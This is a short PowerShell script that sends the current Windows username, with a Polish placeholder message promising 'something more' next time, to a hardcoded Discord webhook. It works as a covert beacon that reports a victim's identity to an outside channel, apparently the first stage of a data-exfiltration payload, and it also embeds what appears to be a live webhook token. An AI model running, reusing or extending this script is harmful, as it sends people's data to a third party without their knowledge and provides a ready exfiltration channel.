$text2 = 'Kolejnym razem bedzie tu cos wiecej'
$dc = "https://discord.com/api/webhooks/1162111449640992889/86j3GRsIdt77zoPwzCqfQ06IRyfwrkDZjCznxrHWwXm_ZaUP6F6aj1OScc4rE0tu85js" 
$Body = @{
  'username' = $env:username
  'content' = $text2
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)
